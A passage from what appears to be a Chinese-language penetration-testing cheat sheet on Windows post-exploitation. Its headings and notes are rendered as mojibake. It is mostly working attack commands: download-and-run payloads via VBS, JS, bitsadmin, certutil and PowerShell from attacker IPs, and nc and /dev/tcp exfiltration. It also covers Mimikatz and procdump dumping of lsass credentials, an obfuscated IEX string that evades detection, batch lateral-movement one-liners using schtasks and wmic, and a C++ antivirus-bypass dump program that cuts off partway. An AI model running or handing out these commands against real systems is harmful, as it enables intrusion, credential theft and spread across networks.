&gt;è¾“å…¥è´¦å·å¯†ç 
&gt;diræŸ¥çœ‹æ–‡ä»¶
&gt;get file.txt
</code></pre>
<p><img src="./img/311.png" alt="image"></p>
<h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><pre><code>#1.vbs
</code></pre>
<pre class="line-numbers language-vb" data-language="vb"><code class="language-vb">Set Post &#x3D; CreateObject(&quot;Msxml2.XMLHTTP&quot;)
Set Shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)
Post.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.1.192&#x2F;Client.exe&quot;,0
Post.Send()
Set aGet &#x3D; CreateObject(&quot;ADODB.Stream&quot;)
aGet.Mode &#x3D; 3
aGet.Type &#x3D; 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile &quot;C:\1.exe&quot;,2 
&gt;cscript 1.vbs
Const adTypeBinary &#x3D; 1
Const adSaveCreateOverWrite &#x3D; 2
Dim http,ado
Set http &#x3D; CreateObject(&quot;Msxml2.serverXMLHTTP&quot;)
http.SetOption 2,13056&#x2F;&#x2F;å¿½ç•¥HTTPSé”™è¯¯
http.open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.1.192&#x2F;Client.exe&quot;,False
http.send
Set ado &#x3D; createobject(&quot;Adodb.Stream&quot;)
ado.Type &#x3D; adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile &quot;c:\1.exe&quot;
ado.Close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> WinHttpReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WinHttp.WinHttpRequest.5.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
WinHttpReq<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> WScript<span class="token punctuation">.</span><span class="token function">Arguments</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">/*async=*/</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
WinHttpReq<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
BinStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"ADODB.Stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
BinStream<span class="token punctuation">.</span>Type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> BinStream<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
BinStream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>WinHttpReq<span class="token punctuation">.</span>ResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>
BinStream<span class="token punctuation">.</span><span class="token function">SaveToFile</span><span class="token punctuation">(</span><span class="token string">"1.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>&gt;cscript /nologo 1.js http://192.168.1.192/Client.exe
</code></pre>
<p><img src="./img/312.png" alt="image"></p>
<h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><pre><code>&gt;bitsadmin /transfer n http://192.168.1.192/Client.exe  e:\1.exe
&gt;bitsadmin /rawreturn /transfer getfile http://192.168.1.192/Client.exe e:\1.exe
&gt;bitsadmin /rawreturn /transfer getpayload http://192.168.1.192/Client.exe e:\1.exe
&gt;bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.1.192/Client.exe&quot; &quot;e:\1.exe &quot;
</code></pre>
<h4 id="Powershell-2"><a href="#Powershell-2" class="headerlink" title="Powershell"></a>Powershell</h4><h5 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h5><pre><code>æ³¨æ„ï¼šå†…æ ¸5.2ä»¥ä¸‹ç‰ˆæœ¬å¯èƒ½æ— æ•ˆ
&gt;powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/Client.exe&#39;,&#39;C:\1.exe&#39;); start-process &#39;c:\1.exe&#39;
&gt;powershell 
&gt;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.0.108/1.exe&#39;,&quot;$env:APPDATA\csrsv.exe&quot;);Start-Process(&quot;$env:APPDATA\csrsv.exe&quot;)
</code></pre>
<h5 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h5><pre><code>PS&gt;Copy-Item &#39;\\sub2k8.zone.com\c$\windows\1.txt&#39; -Destination &#39;\\dc.zone.com\c$\1.txt&#39;
</code></pre>
<h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><pre><code>&gt;powershell ($dpl=$env:temp+&#39;f.exe&#39;);(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.0.108/ok.txt&#39;,$dpl);
</code></pre>
<h5 id="4"><a href="#4" class="headerlink" title="4"></a>4</h5><pre><code>é«˜ç‰ˆæœ¬
PS&gt;iwr -Uri http://192.168.0.106:1222/111.txt -OutFile 123.txt â€“UseBasicParsing
</code></pre>
<h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><pre><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Templates
&gt;Import-Module BitsTransfer
&gt;$path = [environment]::getfolderpath(&quot;temp&quot;)
&gt;Start-BitsTransfer -Source &quot;http://192.168.0.108/ok.txt&quot; -Destination &quot;$path\ok.txt&quot;
&gt;Invoke-Item  &quot;$path\ok.txt&quot;
</code></pre>
<h4 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h4><pre><code>&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 
&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
å¯¹æ–‡ä»¶è¿›è¡Œç¼–ç ä¸‹è½½åè§£ç æ‰§è¡Œ
&gt;base64 payload.exe &gt; /var/www/html/1.txt # åœ¨C&amp;Cä¸Šç”Ÿæˆç»base64ç¼–ç çš„exe
&gt;certutril -urlcache -split -f http://192.168.0.107/1.txt &amp; certurl -decode 1.txt ms.exe &amp; ms.exe
</code></pre>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><pre><code>#python -c &#39;import urllib;urllib.urlretrieve(&quot;http://192.168.1.192/Client.exe&quot;,&quot;/path/to/save/1.exe&quot;)&#39;
</code></pre>
<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre><code>#!/usr/bin/perl 
use LWP::Simple; 
getstore(&quot;http://192.168.1.192/Client.exe&quot;, &quot;1.exe&quot;);
</code></pre>
<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre><code>#!/usr/bin/php 
&lt;?php $data = @file(&quot;http://192.168.1.192/Client.exe&quot;);
$lf = &quot;1.exe&quot;;         
$fh = fopen($lf, &#39;w&#39;);         
fwrite($fh, $data[0]);         
fclose($fh); 
?&gt;
</code></pre>
<h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><pre><code>#curl -o 1.exe http://192.168.1.192/Client.exe
</code></pre>
<h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><pre><code>#wget http://192.168.1.192/Client.exe
#wget â€“båå°ä¸‹è½½
#wget â€“c ä¸­æ–­æ¢å¤
</code></pre>
<h4 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h4><pre><code>&gt;nc â€“lvnp 333 &gt;1.txt
ç›®æ ‡æœº
&gt;nc â€“vn 192.168.1.2 333 &lt;test.txt â€“q 1
&amp;
&gt;cat 1.txt &gt;/dev/tcp/1.1.1.1/333
</code></pre>
<h4 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h4><pre><code>Linuxä¸­ä¼ è¾“æ–‡ä»¶
&gt;scp -P 22 file.txt user@1.1.1.1:/tmp
</code></pre>
<h2 id="Hash-amp-å¯†ç "><a href="#Hash-amp-å¯†ç " class="headerlink" title="Hash&amp;å¯†ç "></a>Hash&amp;å¯†ç </h2><h3 id="ç ´è§£ç½‘å€"><a href="#ç ´è§£ç½‘å€" class="headerlink" title="ç ´è§£ç½‘å€"></a>ç ´è§£ç½‘å€</h3><pre><code>https://www.objectif-securite.ch/en/ophcrack
http://cracker.offensive-security.com/index.php
</code></pre>
<h3 id="GoogleColabç ´è§£hash"><a href="#GoogleColabç ´è§£hash" class="headerlink" title="GoogleColabç ´è§£hash"></a>GoogleColabç ´è§£hash</h3><pre><code>ä¹‹å‰åœ¨freebufä¸Šçœ‹åˆ°è¿‡ç›¸å…³æ–‡ç« ï¼Œæœ€è¿‘åœ¨githubä¸Šä¹Ÿçœ‹åˆ°äº†è¿™ä¸ªè„šæœ¬ï¼Œæ‰€ä»¥æ‹¿èµ·æ¥è¯•è¯•ï¼Œé€Ÿåº¦å¯è§‚
https://www.freebuf.com/geek/195453.html
https://gist.github.com/chvancooten/59acfbf1d8ee7a865108fca2e9d04c4a
æ‰“å¼€
https://drive.google.com/drive
æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå³é”®ï¼Œæ›´å¤šé€‰æ‹©google Colab
</code></pre>
<p><img src="./img/667.png" alt="image"></p>
<pre><code>å¦‚æœæ²¡æœ‰ï¼Œç‚¹å…³è”æ›´å¤šåº”ç”¨ï¼Œæœç´¢è¿™ä¸ªåå­—ï¼Œå®‰è£…ä¸€ä¸‹å³å¯
</code></pre>
<p><img src="./img/668.png" alt="image"><br><img src="./img/669.png" alt="image"></p>
<pre><code>å®‰è£…hashcatï¼Œä¸‹è½½å­—å…¸
</code></pre>
<p><img src="./img/670.png" alt="image"></p>
<pre><code>è¿è¡Œç±»å‹é€‰æ‹©GPUåŠ é€Ÿ
</code></pre>
<p><img src="./img/671.png" alt="image"><br><img src="./img/672.png" alt="image"></p>
<pre><code>è¿™é‡Œæµ‹è¯•ä¸ªç®€å•å¯†ç 
</code></pre>
<p><img src="./img/673.png" alt="image"><br><img src="./img/674.png" alt="image"><br><img src="./img/675.png" alt="image"><br><img src="./img/676.png" alt="image"></p>
<pre><code>12äº¿æ¡å¯†ç å¤§æ¦‚20å¤šåˆ†é’Ÿ
https://download.weakpass.com/wordlists/1851/hashesorg2019.gz
ä»¥ä¸Šæ˜¯å­—å…¸
</code></pre>
<p><img src="./img/677.png" alt="image"></p>
<h3 id="å¯†ç ç­–ç•¥"><a href="#å¯†ç ç­–ç•¥" class="headerlink" title="å¯†ç ç­–ç•¥"></a>å¯†ç ç­–ç•¥</h3><pre><code>é»˜è®¤æƒ…å†µï¼Œä¸»æœºè´¦å·çš„å£ä»¤æ¯30å¤©å˜æ›´ä¸€æ¬¡
&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netlogon\Parametersï¼Œé”®å€¼ä¸ºDisablePasswordChangeï¼Œè®¾ç½®ä¸º1ï¼Œå³è¡¨ç¤ºç¦æ­¢ä¿®æ”¹è´¦å·å£ä»¤
&gt;ç»„ç­–ç•¥(gpedit.msc)ä¸­ä¿®æ”¹é»˜è®¤çš„30å¤©ï¼Œä¿®æ”¹ä½ç½®ä¸º&quot;Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Maximum machine account password age&quot;è®¾ç½®ä¸º0æ—¶ï¼Œè¡¨ç¤ºæ— é™é•¿
&gt;ç¦æ­¢ä¿®æ”¹ä¸»æœºè´¦å·å£ä»¤ï¼Œç”¨æ¥æ”¯æŒVDI (virtual desktops)ç­‰ç±»å‹çš„ä½¿ç”¨ï¼Œå…·ä½“ä½ç½®ä¸º&quot;Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Disable machine account password changes&quot;
Debug Privilege
æœ¬åœ°å®‰å…¨ç­–ç•¥&gt;æœ¬åœ°ç­–ç•¥&gt;ç”¨æˆ·æƒé™åˆ†é…&gt;è°ƒè¯•ç¨‹åº
</code></pre>
<h3 id="å¼€å¯Wdigest"><a href="#å¼€å¯Wdigest" class="headerlink" title="å¼€å¯Wdigest"></a>å¼€å¯Wdigest</h3><h4 id="Cmd-1"><a href="#Cmd-1" class="headerlink" title="Cmd"></a>Cmd</h4><pre><code>&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre><code>&gt;Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
</code></pre>
<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><pre><code>&gt;reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
</code></pre>
<h3 id="Getpass"><a href="#Getpass" class="headerlink" title="Getpass"></a>Getpass</h3><pre><code>&gt;getpassword.exe&gt;1.txt
</code></pre>
<h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h3><pre><code>&gt;QuarksPwDump.exe -dump-hash-local
</code></pre>
<h3 id="MSF-4"><a href="#MSF-4" class="headerlink" title="MSF"></a>MSF</h3><pre><code>Meterpreter &gt; run hashdump 
&amp;
Meterpreter &gt; mimikatz_command -f samdump::hashes
&amp;
Meterpreter &gt; load mimikatz
Meterpreter &gt; wdigest
&amp;
Meterpreter &gt; load mimikatz
Meterpreter &gt; msv
Meterpreter &gt; kerberos
&amp;
Meterpreter &gt; load kiwi
Meterpreter &gt; creds_all
&amp;
Meterpreter &gt; migrate PID
Meterpreter &gt; load mimikatz
Meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords
&amp;
Meterpreter &gt; run windows/gather/smart_hashdump
</code></pre>
<h3 id="Empire-1"><a href="#Empire-1" class="headerlink" title="Empire"></a>Empire</h3><pre><code>&gt;usemodule credentials/mimikatz/dcsync_hashdump
</code></pre>
<h3 id="Invoke-Dcsync"><a href="#Invoke-Dcsync" class="headerlink" title="Invoke-Dcsync"></a>Invoke-Dcsync</h3><pre><code>&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-DCSync.ps1&#39;);invoke-dcsync
</code></pre>
<p><img src="./img/313.png" alt="image"></p>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><h4 id="è°ƒç”¨mimikatzè¿œç¨‹æŠ“å–"><a href="#è°ƒç”¨mimikatzè¿œç¨‹æŠ“å–" class="headerlink" title="è°ƒç”¨mimikatzè¿œç¨‹æŠ“å–"></a>è°ƒç”¨mimikatzè¿œç¨‹æŠ“å–</h4><pre><code>æŠ“æ˜æ–‡
&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/nishang/Gather/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz
æŠ“hash
&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100/nishang/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes
&gt;powershell -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot; &gt;C:\Users\Administrator.DC\Desktop\1123.txt
</code></pre>
<h4 id="æ¨ªå‘æ‰¹é‡æŠ“hash"><a href="#æ¨ªå‘æ‰¹é‡æŠ“hash" class="headerlink" title="æ¨ªå‘æ‰¹é‡æŠ“hash"></a>æ¨ªå‘æ‰¹é‡æŠ“hash</h4><h5 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h5><pre><code>æŠŠIPåˆ—è¡¨æ”¾å…¥ip.txtæ–‡ä»¶ä¸­ï¼Œé€šè¿‡ä¸€ä¸ªè´¦æˆ·å¯†ç æ‰¹é‡net useä¸åˆ—è¡¨é‡Œçš„IPå»ºç«‹è¿æ¥ï¼Œå¦‚æœå»ºç«‹è¿æ¥æ²¡å‡ºé”™çš„è¯ï¼Œå¤åˆ¶getpassåˆ°ç›®å½•tempç›®å½•ï¼Œä½¿ç”¨è´¦æˆ·å¯†ç è¿œç¨‹åˆ›å»ºè®¡åˆ’ä»»åŠ¡åå­—ä¸ºwindowsupdateï¼ŒæŒ‡å®šæ¯æ—¥00ï¼š00ä»¥systemæƒé™æ‰§è¡Œgetpassæ–‡ä»¶ï¼Œåˆ›å»ºå®Œè®¡åˆ’ä»»åŠ¡åï¼Œ/tnæ˜¯ç«‹åˆ»æ‰§è¡Œæ­¤è®¡åˆ’ä»»åŠ¡ï¼Œæ‰§è¡Œå®Œååˆ é™¤æ­¤è®¡åˆ’ä»»åŠ¡ï¼Œping -n 10&gt;nulæ˜¯ç¨‹åºåœç•™ï¼Œç›¸å½“äºå»¶æ—¶10ç§’ï¼Œä¹‹åå¤åˆ¶æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œæ¥ç€åˆ é™¤getpassæ–‡ä»¶ï¼Œåˆ é™¤åˆ›å»ºçš„è¿æ¥ã€‚
&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) &amp; schtasks /create /s &quot;%i&quot; /u &quot;administrator&quot; /p &quot;password&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\getpass.exe&quot; /sc DAILY /mo 1 /ST 00:00 /RU SYSTEM &amp; schtasks /run /tn windowsupdate /s &quot;%i&quot; /U &quot;administrator&quot; /P &quot;password&quot; &amp; schtasks /delete /F /tn windowsupdate /s &quot;%i&quot; /U &quot; administrator&quot; /P &quot;password&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del \\%i\admin$\debug\getpass.exe /F &amp; net use \\%i\admin$ /del
</code></pre>
<h5 id="Wmic"><a href="#Wmic" class="headerlink" title="Wmic"></a>Wmic</h5><pre><code>&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\temp\getpass.exe&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del \\%i\admin$\temp\getpass.exe /F &amp; net use \\%i\admin$ /del
</code></pre>
<h4 id="ç›´æ¥ä½¿ç”¨"><a href="#ç›´æ¥ä½¿ç”¨" class="headerlink" title="ç›´æ¥ä½¿ç”¨"></a>ç›´æ¥ä½¿ç”¨</h4><pre><code>&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt 
&gt;privilege::debug
&gt;misc::memssp
é”å±
&gt;rundll32.exe user32.dll,LockWorkStation
è®°å½•çš„ç»“æœåœ¨c:\windows\system32\mimilsa.log
&gt;mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;
&gt;mimikatz !privilege::debug 
&gt;mimikatz !token::elevate 
&gt;mimikatz !lsadump::sam
</code></pre>
<h4 id="Powershell-Bypass"><a href="#Powershell-Bypass" class="headerlink" title="Powershell Bypass"></a>Powershell Bypass</h4><pre><code>&gt;powershell -c &quot; (&#39;IEX &#39;+&#39;(Ne&#39;+&#39;w-O&#39;+&#39;bject Ne&#39;+&#39;t.W&#39;+&#39;ebClien&#39;+&#39;t).Do&#39;+&#39;wnloadS&#39;+&#39;trin&#39;+&#39;g&#39;+&#39;(&#39;+&#39;1vchttp://&#39;+&#39;192.168.0&#39;+&#39;.101/&#39;+&#39;Inv&#39;+&#39;oke-Mimik&#39;+&#39;a&#39;+&#39;tz.&#39;+&#39;ps11v&#39;+&#39;c)&#39;+&#39;;&#39;+&#39;I&#39;+&#39;nvoke-Mimika&#39;+&#39;tz&#39;).REplaCE(&#39;1vc&#39;,[STRing][CHAR]39)|IeX&quot;
</code></pre>
<h4 id="net-2-0"><a href="#net-2-0" class="headerlink" title=".net 2.0"></a>.net 2.0</h4><pre><code>katz.csæ”¾ç½®C:\Windows\Microsoft.NET\Framework\v2.0.50727
Powershellæ‰§è¡Œ
&gt;$key = &#39;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#39;
&gt;$Content = [System.Convert]::FromBase64String($key)
&gt;Set-Content key.snk -Value $Content â€“Encoding Byte
Cmdæ‰§è¡Œ
&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs
&gt;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe
</code></pre>
<h4 id="net-4-0-Msbuild"><a href="#net-4-0-Msbuild" class="headerlink" title=".net 4.0 Msbuild"></a>.net 4.0 Msbuild</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild mimi.xml
</code></pre>
<h4 id="JScript"><a href="#JScript" class="headerlink" title="JScript"></a>JScript</h4><pre><code>&gt;wmic os get /format:&quot;mimikatz.xsl&quot;
</code></pre>
<p><img src="./img/314.png" alt="image"></p>
<pre><code>&gt;wmic os get /format:&quot;http://192.168.0.107/ps/mimi.xsl&quot;
</code></pre>
<h4 id="Procdump64-mimikatz"><a href="#Procdump64-mimikatz" class="headerlink" title="Procdump64+mimikatz"></a>Procdump64+mimikatz</h4><pre><code>&gt;procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
&gt;procdump.exe -accepteula -ma lsass.exe lsass.dmp
&gt;mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1&#39;);Invoke-Procdump64 -Args &#39;-accepteula -ma lsass.exe lsass.dmp&#39;&quot;
</code></pre>
<h4 id="Dumpert"><a href="#Dumpert" class="headerlink" title="Dumpert"></a>Dumpert</h4><pre><code>https://github.com/outflanknl/Dumpert
æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯dllï¼Œå¯æ‰§è¡Œæ–‡ä»¶å’Œcsçš„Aggressoræ’ä»¶ï¼Œè¿™é‡Œæµ‹è¯•ä¸‹dllå’Œexe
DLLçš„æ‰§è¡Œæ–¹å¼æ˜¯
rundll32.exe C:\Outflank-Dumpert.dll,Dump
</code></pre>
<p><img src="./img/653.png" alt="image"></p>
<pre><code>æ–‡ä»¶ä¿å­˜åœ¨c:\windows\temp\dumpert.dmp
ç”¨mimikatz
&gt;sekurlsa::mimidump c:\windows\temp\dumpert.dmp
&gt;sekurlsa::logonpasswords
</code></pre>
<p><img src="./img/654.png" alt="image"></p>
<pre><code>å¯æ‰§è¡Œæ–‡ä»¶å°±ç›´æ¥æ‰§è¡Œå°±å¯ä»¥äº†
</code></pre>
<p><img src="./img/655.png" alt="image"><br><img src="./img/656.png" alt="image"><br><img src="./img/657.png" alt="image"></p>
<h4 id="Cisco-Jabberè½¬å‚¨lsass"><a href="#Cisco-Jabberè½¬å‚¨lsass" class="headerlink" title="Cisco Jabberè½¬å‚¨lsass"></a>Cisco Jabberè½¬å‚¨lsass</h4><pre><code>cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
</code></pre>
<h4 id="ç»•è¿‡å¡å·´æ–¯åŸº"><a href="#ç»•è¿‡å¡å·´æ–¯åŸº" class="headerlink" title="ç»•è¿‡å¡å·´æ–¯åŸº"></a>ç»•è¿‡å¡å·´æ–¯åŸº</h4><pre><code>https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e
</code></pre>
<p><img src="./img/315.png" alt="image"></p>
<pre><code>å°†ä¸‰ä¸ªæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨visual studioè¿›è¡Œç¼–è¯‘ï¼Œéœ€è¦ä¿®æ”¹äº†å‡ ä¸ªåœ°æ–¹ã€‚
ï¼ˆ1ï¼‰æ·»åŠ å¦‚ä¸‹ä»£ç 
#pragma comment(lib, &quot;Rpcrt4.lib&quot;) ï¼ˆå¼•å…¥Rpcrt4.libåº“æ–‡ä»¶ï¼‰
ï¼ˆ2ï¼‰å°†.cæ–‡ä»¶åç¼€æ”¹æˆ.cpp ï¼ˆä½¿ç”¨äº†c++ä»£ç ï¼Œéœ€è¦æ›´æ”¹åç¼€ï¼‰
ï¼ˆ3) ç¼–è¯‘æ—¶é€‰æ‹©x64
ç¼–è¯‘å¾—åˆ°exeæ–‡ä»¶
Visual studioåˆ›å»ºc++ç©ºé¡¹ç›®
é…ç½®ç±»å‹é€‰dll
å­—ç¬¦é›†é€‰Unicodeï¼Œè°ƒè¯•å™¨é€‰64ä½
Dllä¿å­˜åœ¨C:\\windows\\temp\\1.bin
</code></pre>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;DbgHelp.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;map></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;TlHelp32.h></span> </span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span></span><span class="token string">"Dbghelp.lib"</span><span class="token expression"><span class="token punctuation">)</span></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">FindPID</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	PROCESSENTRY32 pe32<span class="token punctuation">;</span>
	pe32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>

	HANDLE hProcessSnap <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hProcessSnap <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
